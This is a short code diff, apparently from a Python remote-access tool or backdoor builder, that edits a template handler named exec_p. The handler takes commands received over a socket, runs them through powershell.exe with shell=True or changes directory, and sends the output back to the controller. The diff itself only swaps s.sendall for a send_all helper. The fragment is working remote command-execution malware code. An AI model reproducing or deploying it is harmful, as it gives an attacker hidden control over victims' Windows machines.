@@ -13,12 +13,12 @@ def exec_p(execute):
     if execute[:3] == 'cd ':
         execute = execute.replace('cd ', '', 1)
         chdir(execute)
-        s.sendall(("[+]Changed to directory : " + execute).encode())
+        send_all(s,"[+]Changed to directory : " + execute)
     else:
         result = Popen('powershell.exe ' + execute, shell=True, stdout=PIPE, stderr=PIPE,
                        stdin=PIPE)
         result = result.stdout.read() + result.stderr.read() 
-        s.sendall(('[+]Command output : \\n' + result.decode()).encode())''')
+        send_all(s,'[+]Command output : \\n' + result.decode())''')
         config.logics.append('''
             elif command == "exec_p":
                 exec_p(data)''')
